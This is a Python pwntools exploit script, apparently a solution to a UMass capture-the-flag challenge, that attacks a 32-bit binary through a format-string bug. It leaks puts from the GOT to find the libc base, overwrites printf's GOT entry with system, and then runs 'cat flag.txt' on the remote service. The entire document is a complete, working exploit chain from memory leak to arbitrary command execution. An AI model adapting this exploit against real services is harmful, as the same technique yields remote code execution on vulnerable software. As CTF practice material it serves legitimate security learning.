#!/usr/bin/env python3
from pwn import *

context.clear(arch='i386')

HOST = 'brick-city-office-space.pwn.ctf.umasscybersec.org'
PORT = 45001

exe = ELF('./BrickCityOfficeSpace')
libc = ELF('./libc.so.6')
ld = './ld-linux.so.2'

OFFSET = 4  # found via AAAABBBB.%4$08x -> 41414141
DELIM = b'QQQQQQQQ'


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([ld, '--library-path', '.', exe.path] + argv, *a, **kw)


def send_design(io, data: bytes) -> bytes:
    io.recvuntil(b'BrickCityOfficeSpace> ')
    io.sendline(data)
    return io.recvuntil(b'Would you like to redesign? (y/n)')


def main():
    io = start()

    # 1) Leak puts@GLIBC via format string: print 4 bytes at puts@GOT
    leak_payload = p32(exe.got['puts']) + f'%{OFFSET}$.4s'.encode() + DELIM
    out = send_design(io, leak_payload)
    idx = out.find(DELIM)
    if idx == -1:
        log.failure('failed to find delimiter (leak parse)')
        io.close()
        return

    puts_leak = u32(out[idx - 4:idx])
    libc_base = puts_leak - libc.symbols['puts']
    system = libc_base + libc.symbols['system']

    log.info(f'puts leak: {hex(puts_leak)}')
    log.info(f'libc base: {hex(libc_base)}')
    log.info(f'system:    {hex(system)}')

    # 2) Loop (answer y), overwrite printf@GOT -> system using %hn writes
    io.sendline(b'y')
    write_payload = fmtstr_payload(OFFSET, {exe.got['printf']: system}, write_size='short')
    send_design(io, write_payload)

    # 3) Loop again, now "printf(user_input)" == system(user_input)
    io.sendline(b'y')
    out2 = send_design(io, b'cat flag.txt')

    for line in out2.split(b'\n'):
        if b'UMASS{' in line:
            print(line.decode(errors='ignore'))
            break

    io.close()


if __name__ == '__main__':
    main()
